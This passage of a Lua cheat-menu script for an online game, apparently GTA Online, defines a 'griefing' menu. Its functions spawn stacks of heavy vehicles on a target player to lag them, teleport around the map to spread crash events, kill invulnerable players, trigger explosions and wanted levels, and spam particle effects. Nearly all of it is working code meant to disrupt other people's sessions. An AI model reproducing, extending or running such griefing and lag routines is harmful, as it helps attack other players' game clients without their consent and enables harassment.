    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(vehicle4)

    ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle2, vehicle1, 0, 0, 3, 0, 0, 0, -180, 0, false, true, false, 0, true)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle3, vehicle1, 0, 3, 3, 0, 0, 0, -180, 0, false, true, false, 0, true)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle4, vehicle1, 0, 3, 0, 0, 0, 0, 0, 0, false, true, false, 0, true)
    ENTITY.SET_ENTITY_VISIBLE(vehicle1, false)
    util.yield(1200)
    entities.delete_by_handle(vehicle1)
end, nil, nil, COMMANDPERM_AGGRESSIVE)


menu.toggle_loop(griefing, "Tp Spread Your Shit", {"tpspread"}, "Note: Great for spreading any kinda mods like gifting vehicles or crash events.", function(on_toggle)
    local player_ped = PLAYER.PLAYER_PED_ID()    
    local old_coords = ENTITY.GET_ENTITY_COORDS(player_ped)
    local pld = PLAYER.GET_PLAYER_PED(pid)
    local pos = ENTITY.GET_ENTITY_COORDS(pld)
    ENTITY.SET_ENTITY_COORDS_NO_OFFSET(player_ped, 446.9146, 5571.7847, 781.1893)
    util.yield(1000)
    for i=1,4  do
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(player_ped, -8000.0, 15999.0, 1337.0)
        util.yield(1000)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(player_ped, 8000.0, 15999.0, 228.0)
        util.yield(1000)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(player_ped, -15999, 8000.0, 1488.0)
        util.yield(1000)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(player_ped, 15980, 8000.0, 2511.0)
        util.yield(1000)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(player_ped, 0.0, 0.0, 3333.0)
        util.yield(1000)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(player_ped, 228.0, 1337.0, 300.0)
        util.yield(1000)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(player_ped, 1488.0, 2511.0, 500.0)
        util.yield(1000)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(player_ped, -1488, 228.0, 100.0)
        util.yield(1000)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(player_ped, 236.49693, -3287.1396, 218.94739)
        util.yield(1000)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(player_ped, -302.23087, -2746.616, 218.8274)
        util.yield(1000)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(player_ped, 1080.0892, -3216.1692, 218.92738)
        util.yield(1000)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(player_ped, 1426.7888, -1947.4331, 219.22739)
        util.yield(1000)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(player_ped, 31.003777, -1712.2998, 218.85739)
        util.yield(1000)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(player_ped, -1088.2968, -1741.2317, 218.80739)
        util.yield(1000)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(player_ped, 38.926704, -1179.2107, 218.72739)
        util.yield(1000)
        PLAYER.SET_PLAYER_PARACHUTE_MODEL_OVERRIDE(PLAYER.PLAYER_ID(), -598185919)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(player_ped, 1176.0138, -1155.3312, 218.7024)
        util.yield(1000)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(player_ped, 2023.5466, -1586.9934, 254.41751)
        util.yield(1000)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(player_ped, 1574.8975, -219.79503, 248.27252)
        util.yield(1000)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(player_ped, 282.33118, -918.1664, 248.51253)
        util.yield(1000)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(player_ped, -1311.2397, -1089.2617, 113.432526)
        util.yield(1000)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(player_ped, -480.3737, -512.02185, 112.97753)
        util.yield(1000)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(player_ped, 194.14796, -237.3122, 113.07253)
        util.yield(1000)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(player_ped, -941.7805, -559.6383, 278.2239)
        util.yield(1000)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(player_ped, -1778.0647, -135.50127, 77.71641)
        util.yield(1000)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(player_ped, -345.4514, 68.930046, 64.106674)
        util.yield(1000)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(player_ped, 626.34033, 675.4374, 297.40192)
        util.yield(1000)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(player_ped, -598.3136, 921.597, 480.12753)
        util.yield(1000)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(player_ped, 1225.7482, 1030.5653, 398.89493)
        util.yield(1000)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(player_ped, 2550.7805, 1474.307, 257.3236)
        util.yield(1000)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(player_ped, 1031.0272, 2336.2424, 299.46002)
        util.yield(1000)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(player_ped, -2685.176, 1309.161, 358.17316)
        util.yield(1000)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(player_ped, -2234.161, 3063.7195, 237.47542)
        util.yield(1000)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(player_ped, -125.09618, 2889.9546, 47.616943)
        util.yield(1000)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(player_ped, 3048.5022, 2890.6616, 337.49854)
        util.yield(1000)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(player_ped, 1612.4764, 3361.4456, 255.20859)
        util.yield(1000)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(player_ped, 94.61467, 3411.8962, 274.70602)
        util.yield(1000)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(player_ped, -958.8649, 3844.8564, 562.46686)
        util.yield(1000)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(player_ped, 457.30515, 5584.596, 820.92474)
        util.yield(1000)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(player_ped, 1859.5883, 3834.0137, 241.04352)
        util.yield(1000)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(player_ped, 3164.7686, 4709.6646, 189.8146)
        util.yield(1000)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(player_ped, 1749.2878, 5132.794, 334.62112)
        util.yield(1000)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(player_ped, -149.20198, 6372.635, 129.9393)
        util.yield(1000)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(player_ped, -1101.6176, 4935.697, 375.57968)
        util.yield(1000)
        PLAYER.SET_PLAYER_PARACHUTE_MODEL_OVERRIDE(PLAYER.PLAYER_ID(), -598185919)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(player_ped, 1419.6901, 6478.1836, 341.80444)
        util.yield(1000)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(player_ped, 463.5963, 5572.5386, 999.6124)
        util.yield(1000)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(player_ped, 70.43196, 6630.405, 166.17345)
        util.yield(1000)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(player_ped, 2549.6033, 6189.2363, 165.15588)
        util.yield(1000)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(player_ped, -1336.5128, -3044.2126, 85.78445)
        util.yield(1000)
    end
    ENTITY.SET_ENTITY_COORDS_NO_OFFSET(player_ped, old_coords.x, old_coords.y, old_coords.z)
end)
---------------------------------------------------------------------------------------------------------------------
menu.toggle_loop(griefing, "Give Wanted", {"givewanted"}, "", function(on_toggle)
        local p_hash = util.joaat("s_m_y_swat_01")
        local c 
        local cop
        for i=0, 5 do
            c = players.get_position(pid)
            c.z = 2500
            request_model_load(p_hash)
            local cop = entities.create_ped(6, p_hash, c, 0)
            FIRE.ADD_OWNED_EXPLOSION(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid), c.x, c.y, c.z, 1, 100.0, false, true, 0.0)
            util.yield(2000)
            entities.delete_by_handle(cop)
        end
    end)

	ptfxloop = menu.list(griefing, "PTFX Loops", {"ptfxloops"}, "", function(); end)

                	local pos = players.get_position(pid)

--Ptfx

menu.toggle_loop(ptfxloop, "Electric", {"ptfxelectric"}, "", function(on_toggle)
            request_ptfx_asset("core")
            GRAPHICS.USE_PARTICLE_FX_ASSET("core")
            GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
                "ent_sht_electrical_box", pos.x, pos.y, pos.z, 0, 0, 0, 2.5, false, false, false)
            request_ptfx_asset("core")
            GRAPHICS.USE_PARTICLE_FX_ASSET("core")
            GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
                "ent_sht_electrical_box", pos.x, pos.y, pos.z, 0, 0, 0, 2.5, false, false, false)
	end)

menu.toggle_loop(ptfxloop, "Smoke", {"ptfxsmoke"}, "", function(on_toggle)
            request_ptfx_asset("core")
            GRAPHICS.USE_PARTICLE_FX_ASSET("core")
            GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
                "veh_respray_smoke", pos.x, pos.y, pos.z, 0, 0, 0, 2.5, false, false, false)
            request_ptfx_asset("core")
            GRAPHICS.USE_PARTICLE_FX_ASSET("core")
            GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
                "veh_respray_smoke", pos.x, pos.y, pos.z, 0, 0, 0, 2.5, false, false, false)
	end)

menu.toggle_loop(ptfxloop, "Clown Explosions", {"ptfxclown"}, "", function(on_toggle)
		request_ptfx_asset("scr_rcbarry2")
		GRAPHICS.USE_PARTICLE_FX_ASSET("scr_rcbarry2")
		GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
            "scr_clown_death", pos.x, pos.y, pos.z, 0, 0, 0, 2.5, false, false, false)
		request_ptfx_asset("scr_rcbarry2")
		GRAPHICS.USE_PARTICLE_FX_ASSET("scr_rcbarry2")
		GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
            "scr_exp_clown", pos.x, pos.y, pos.z, 0, 0, 0, 2.5, false, false, false)
	end)

menu.toggle_loop(ptfxloop, "Extinguisher", {"ptfxextinguisher"}, "", function(on_toggle)
            request_ptfx_asset("core")
            GRAPHICS.USE_PARTICLE_FX_ASSET("core")
            GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
                "exp_extinguisher", pos.x, pos.y, pos.z, 0, 0, 0, 2.5, false, false, false)
            request_ptfx_asset("core")
            GRAPHICS.USE_PARTICLE_FX_ASSET("core")
            GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
                "exp_extinguisher", pos.x, pos.y, pos.z, 0, 0, 0, 2.5, false, false, false)
	end)

menu.toggle_loop(ptfxloop, "Water Mist", {"ptfxwatermist"}, "", function(on_toggle)
            GRAPHICS.USE_PARTICLE_FX_ASSET("core")
            GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
                "ent_anim_bm_water_mist", pos.x, pos.y, pos.z, 0, 0, 0, 2.5, false, false, false)
            GRAPHICS.USE_PARTICLE_FX_ASSET("core")
            GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
                "ent_anim_bm_water_mist", pos.x, pos.y, pos.z, 0, 0, 0, 2.5, false, false, false)
	end)
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

	centipedegriefing = menu.list(griefing, "Human Centipede", {}, "", function(); end)

menu.action(centipedegriefing, "Human Centipede", {"centipede"}, "", function()
    local c = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid), true)
    all_peds = entities.get_all_peds_as_handles()
    local last_ped = 0
    local last_ped_ht = 0
    for k,ped in pairs(all_peds) do
        if not PED.IS_PED_A_PLAYER(ped) and not PED.IS_PED_FATALLY_INJURED(ped) then
            get_control_request(ped)
            if PED.IS_PED_IN_ANY_VEHICLE(ped, true) then
                TASK.CLEAR_PED_TASKS_IMMEDIATELY(ped)
                TASK.TASK_LEAVE_ANY_VEHICLE(ped, 0, 16)
            end

            ENTITY.DETACH_ENTITY(ped, false, false)
            if last_ped ~= 0 then
                ENTITY.ATTACH_ENTITY_TO_ENTITY(ped, last_ped, 0, 0.0, 0.0, last_ped_ht-0.5, 0.0, 0.0, 0.0, false, false, false, false, 0, false)
            else
                ENTITY.SET_ENTITY_COORDS(ped, c.x, c.y, c.z)
            end
            last_ped = ped
        end
    end
end, nil, nil, COMMANDPERM_AGGRESSIVE)

menu.toggle_loop(centipedegriefing, "Human Centipede", {"togglecentipede"}, "", function(on_toggle)
    local c = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid), true)
    all_peds = entities.get_all_peds_as_handles()
    local last_ped = 0
    local last_ped_ht = 0
    for k,ped in pairs(all_peds) do
        if not PED.IS_PED_A_PLAYER(ped) and not PED.IS_PED_FATALLY_INJURED(ped) then
            get_control_request(ped)
            if PED.IS_PED_IN_ANY_VEHICLE(ped, true) then
                TASK.CLEAR_PED_TASKS_IMMEDIATELY(ped)
                TASK.TASK_LEAVE_ANY_VEHICLE(ped, 0, 16)
            end

            ENTITY.DETACH_ENTITY(ped, false, false)
            if last_ped ~= 0 then
                ENTITY.ATTACH_ENTITY_TO_ENTITY(ped, last_ped, 0, 0.0, 0.0, last_ped_ht-0.5, 0.0, 0.0, 0.0, false, false, false, false, 0, false)
            else
                ENTITY.SET_ENTITY_COORDS(ped, c.x, c.y, c.z)
            end
            last_ped = ped
        end
    end
end, nil, nil, COMMANDPERM_AGGRESSIVE)

	killgods = menu.list(griefing, "Kill Godmode Shit", {}, "", function(); end)

	menu.action(killgods, "Kill Godmode Player V1", {"killgod"}, "", function()
		menu.trigger_commands("confuse" .. PLAYER.GET_PLAYER_NAME(pid))
		menu.trigger_commands("explodeloop" .. PLAYER.GET_PLAYER_NAME(pid))
    	end, nil, nil, COMMANDPERM_AGGRESSIVE)

menu.action(killgods, "Kill Godmode Player V2", {"killgodv2"}, "Note: this will not work if they have no ragdoll on", function()
    local id = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    local playerpos = ENTITY.GET_ENTITY_COORDS(id)
    playerpos.z = playerpos.z + 3

    local khanjali = util.joaat("khanjali")
    STREAMING.REQUEST_MODEL(khanjali)
    while not STREAMING.HAS_MODEL_LOADED(khanjali) do
        util.yield()
    end

    local vehicle1 = entities.create_vehicle(khanjali, ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(PLAYER.GET_PLAYER_PED(pid), 0, 2, 3), ENTITY.GET_ENTITY_HEADING(id))
    local vehicle2 = entities.create_vehicle(khanjali, playerpos, 0)
    local vehicle3 = entities.create_vehicle(khanjali, playerpos, 0)
    local vehicle4 = entities.create_vehicle(khanjali, playerpos, 0)

    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(vehicle1)
    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(vehicle2)
    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(vehicle3)
    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(vehicle4)

    ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle2, vehicle1, 0, 0, 3, 0, 0, 0, -180, 0, false, true, false, 0, true)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle3, vehicle1, 0, 3, 3, 0, 0, 0, -180, 0, false, true, false, 0, true)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle4, vehicle1, 0, 3, 0, 0, 0, 0, 0, 0, false, true, false, 0, true)
    ENTITY.SET_ENTITY_VISIBLE(vehicle1, false)
    util.yield(1200)
    entities.delete_by_handle(vehicle1)
end, nil, nil, COMMANDPERM_AGGRESSIVE)

	lagwiths = menu.list(griefing, "Lag With Shit", {}, "", function(); end)


menu.toggle_loop(lagwiths, "Lag With Tug's", {"lagwithtugs"}, "", function()
    local id = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    local playerpos = ENTITY.GET_ENTITY_COORDS(id)
    playerpos.z = playerpos.z + 3

    local khanjali = util.joaat("tug")
    STREAMING.REQUEST_MODEL(khanjali)
    while not STREAMING.HAS_MODEL_LOADED(khanjali) do
        util.yield()
    end

    local vehicle1 = entities.create_vehicle(khanjali, ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(PLAYER.GET_PLAYER_PED(pid), 0, 2, 3), ENTITY.GET_ENTITY_HEADING(id))
    local vehicle2 = entities.create_vehicle(khanjali, playerpos, 0)
    local vehicle3 = entities.create_vehicle(khanjali, playerpos, 0)
    local vehicle4 = entities.create_vehicle(khanjali, playerpos, 0)

    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(vehicle1)
    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(vehicle2)
    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(vehicle3)
    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(vehicle4)

    ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle2, vehicle1, 0, 0, 3, 0, 0, 0, -180, 0, false, true, false, 0, true)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle3, vehicle1, 0, 3, 3, 0, 0, 0, -180, 0, false, true, false, 0, true)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle4, vehicle1, 0, 3, 0, 0, 0, 0, 0, 0, false, true, false, 0, true)
    ENTITY.SET_ENTITY_VISIBLE(vehicle1, true)
    util.yield(10000)
end, nil, nil, COMMANDPERM_AGGRESSIVE)

menu.toggle_loop(lagwiths, "Lag With Tug's V2", {"lagwithtugsv2"}, "", function()
    local id = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    local playerpos = ENTITY.GET_ENTITY_COORDS(id)
    playerpos.z = playerpos.z + 3
    local khanjali = util.joaat("tug")
    STREAMING.REQUEST_MODEL(khanjali)
    while not STREAMING.HAS_MODEL_LOADED(khanjali) do
        util.yield()
    end

    local vehicle1 = entities.create_vehicle(khanjali, ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(PLAYER.GET_PLAYER_PED(pid), 0, 2, 3), ENTITY.GET_ENTITY_HEADING(id))
        ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle1, id, playerpos, 0, 0, 0, 0, 0, 0, 0, 0, true, true, false, 0, true)
		ENTITY.SET_ENTITY_VISIBLE(vehicle1, true, 0)
    local vehicle2 = entities.create_vehicle(khanjali, playerpos, 0)
        ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle1, id, playerpos, 0, 0, 0, 0, 0, 0, 0, 0, true, true, false, 0, true)
		ENTITY.SET_ENTITY_VISIBLE(vehicle1, true, 0)
    local vehicle3 = entities.create_vehicle(khanjali, playerpos, 0)
        ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle1, id, playerpos, 0, 0, 0, 0, 0, 0, 0, 0, true, true, false, 0, true)
		ENTITY.SET_ENTITY_VISIBLE(vehicle1, true, 0)
    local vehicle4 = entities.create_vehicle(khanjali, playerpos, 0)
        ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle1, id, playerpos, 0, 0, 0, 0, 0, 0, 0, 0, true, true, false, 0, true)
		ENTITY.SET_ENTITY_VISIBLE(vehicle1, true, 0)
    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(vehicle1)
    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(vehicle2)
    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(vehicle3)
    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(vehicle4)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle2, vehicle1, 0, 0, 3, 0, 0, 0, -180, 0, false, true, false, 0, true)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle3, vehicle1, 0, 3, 3, 0, 0, 0, -180, 0, false, true, false, 0, true)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle4, vehicle1, 0, 3, 0, 0, 0, 0, 0, 0, false, true, false, 0, true)
    ENTITY.SET_ENTITY_VISIBLE(vehicle1, true)
    util.yield(10000)
end)

menu.toggle_loop(lagwiths, "Lag With Cargobob's", {"lagwithcargos"}, "", function()
    local id = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    local playerpos = ENTITY.GET_ENTITY_COORDS(id)
    playerpos.z = playerpos.z + 3

    local khanjali = util.joaat("cargobob")
    STREAMING.REQUEST_MODEL(khanjali)
    while not STREAMING.HAS_MODEL_LOADED(khanjali) do
        util.yield()
    end

    local vehicle1 = entities.create_vehicle(khanjali, ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(PLAYER.GET_PLAYER_PED(pid), 0, 2, 3), ENTITY.GET_ENTITY_HEADING(id))
    local vehicle2 = entities.create_vehicle(khanjali, playerpos, 0)
    local vehicle3 = entities.create_vehicle(khanjali, playerpos, 0)
    local vehicle4 = entities.create_vehicle(khanjali, playerpos, 0)

    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(vehicle1)
    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(vehicle2)
    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(vehicle3)
    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(vehicle4)

    ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle2, vehicle1, 0, 0, 3, 0, 0, 0, -180, 0, false, true, false, 0, true)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle3, vehicle1, 0, 3, 3, 0, 0, 0, -180, 0, false, true, false, 0, true)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle4, vehicle1, 0, 3, 0, 0, 0, 0, 0, 0, false, true, false, 0, true)
    ENTITY.SET_ENTITY_VISIBLE(vehicle1, true)
    util.yield(0)
end, nil, nil, COMMANDPERM_AGGRESSIVE)



menu.toggle_loop(lagwiths, "Lag With Cargobob's V2", {"lagwithcargosv2"}, "", function()

    local id = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    local TargetPlayerPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
    local TargetPlayerPos = ENTITY.GET_ENTITY_COORDS(TargetPlayerPed, true)
    local playerpos = ENTITY.GET_ENTITY_COORDS(id)
    playerpos.z = playerpos.z + 3
    local khanjali = util.joaat("cargobob")
    STREAMING.REQUEST_MODEL(khanjali)
    while not STREAMING.HAS_MODEL_LOADED(khanjali) do
        util.yield()
    end

    local vehicle1 = entities.create_vehicle(khanjali, ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(PLAYER.GET_PLAYER_PED(pid), 0, 2, 3), ENTITY.GET_ENTITY_HEADING(id))
        ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle1, id, playerpos, 0, 0, 0, 0, 0, 0, 0, 0, true, true, false, 0, true)
		ENTITY.SET_ENTITY_VISIBLE(vehicle1, true, 0)
    local vehicle2 = entities.create_vehicle(khanjali, playerpos, 0)
        ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle1, id, playerpos, 0, 0, 0, 0, 0, 0, 0, 0, true, true, false, 0, true)
		ENTITY.SET_ENTITY_VISIBLE(vehicle1, true, 0)
    local vehicle3 = entities.create_vehicle(khanjali, playerpos, 0)
        ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle1, id, playerpos, 0, 0, 0, 0, 0, 0, 0, 0, true, true, false, 0, true)
		ENTITY.SET_ENTITY_VISIBLE(vehicle1, true, 0)
    local vehicle4 = entities.create_vehicle(khanjali, playerpos, 0)
        ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle1, id, playerpos, 0, 0, 0, 0, 0, 0, 0, 0, true, true, false, 0, true)
		ENTITY.SET_ENTITY_VISIBLE(vehicle1, true, 0)
    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(vehicle1)
    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(vehicle2)
    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(vehicle3)
    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(vehicle4)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle2, vehicle1, 0, 0, 3, 0, 0, 0, -180, 0, false, true, false, 0, true)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle3, vehicle1, 0, 3, 3, 0, 0, 0, -180, 0, false, true, false, 0, true)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle4, vehicle1, 0, 3, 0, 0, 0, 0, 0, 0, false, true, false, 0, true)
    ENTITY.SET_ENTITY_VISIBLE(vehicle1, true)
    util.yield(0)
end)

menu.toggle_loop(lagwiths, "Lag With Sub's", {"lagwithsubs"}, "", function()
    local id = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    local playerpos = ENTITY.GET_ENTITY_COORDS(id)
    playerpos.z = playerpos.z + 3

    local khanjali = util.joaat("kosatka")
    STREAMING.REQUEST_MODEL(khanjali)
    while not STREAMING.HAS_MODEL_LOADED(khanjali) do
        util.yield()
    end

    local vehicle1 = entities.create_vehicle(khanjali, ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(PLAYER.GET_PLAYER_PED(pid), 0, 2, 3), ENTITY.GET_ENTITY_HEADING(id))
    local vehicle2 = entities.create_vehicle(khanjali, playerpos, 0)
    local vehicle3 = entities.create_vehicle(khanjali, playerpos, 0)
    local vehicle4 = entities.create_vehicle(khanjali, playerpos, 0)

    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(vehicle1)
    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(vehicle2)
    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(vehicle3)
    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(vehicle4)

    ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle2, vehicle1, 0, 0, 3, 0, 0, 0, -180, 0, false, true, false, 0, true)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle3, vehicle1, 0, 3, 3, 0, 0, 0, -180, 0, false, true, false, 0, true)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle4, vehicle1, 0, 3, 0, 0, 0, 0, 0, 0, false, true, false, 0, true)
    ENTITY.SET_ENTITY_VISIBLE(vehicle1, true)
    util.yield(0)
end, nil, nil, COMMANDPERM_AGGRESSIVE)

menu.toggle_loop(lagwiths, "Lag With Sub's V2", {"lagwithsubsv2"}, "", function()
    local id = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    local TargetPlayerPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
    local TargetPlayerPos = ENTITY.GET_ENTITY_COORDS(TargetPlayerPed, true)
    local playerpos = ENTITY.GET_ENTITY_COORDS(id)
    playerpos.z = playerpos.z + 3
    local khanjali = util.joaat("kosatka")
    STREAMING.REQUEST_MODEL(khanjali)
    while not STREAMING.HAS_MODEL_LOADED(khanjali) do
        util.yield()
    end

    local vehicle1 = entities.create_vehicle(khanjali, ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(PLAYER.GET_PLAYER_PED(pid), 0, 2, 3), ENTITY.GET_ENTITY_HEADING(id))
        ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle1, id, playerpos, 0, 0, 0, 0, 0, 0, 0, 0, true, true, false, 0, true)
		ENTITY.SET_ENTITY_VISIBLE(vehicle1, true, 0)
    local vehicle2 = entities.create_vehicle(khanjali, playerpos, 0)
        ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle1, id, playerpos, 0, 0, 0, 0, 0, 0, 0, 0, true, true, false, 0, true)
		ENTITY.SET_ENTITY_VISIBLE(vehicle1, true, 0)
    local vehicle3 = entities.create_vehicle(khanjali, playerpos, 0)
        ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle1, id, playerpos, 0, 0, 0, 0, 0, 0, 0, 0, true, true, false, 0, true)
		ENTITY.SET_ENTITY_VISIBLE(vehicle1, true, 0)
    local vehicle4 = entities.create_vehicle(khanjali, playerpos, 0)
        ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle1, id, playerpos, 0, 0, 0, 0, 0, 0, 0, 0, true, true, false, 0, true)
		ENTITY.SET_ENTITY_VISIBLE(vehicle1, true, 0)
    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(vehicle1)
    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(vehicle2)
    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(vehicle3)
    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(vehicle4)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle2, vehicle1, 0, 0, 3, 0, 0, 0, -180, 0, false, true, false, 0, true)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle3, vehicle1, 0, 3, 3, 0, 0, 0, -180, 0, false, true, false, 0, true)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle4, vehicle1, 0, 3, 0, 0, 0, 0, 0, 0, false, true, false, 0, true)
    ENTITY.SET_ENTITY_VISIBLE(vehicle1, true)
    util.yield(0)
end)

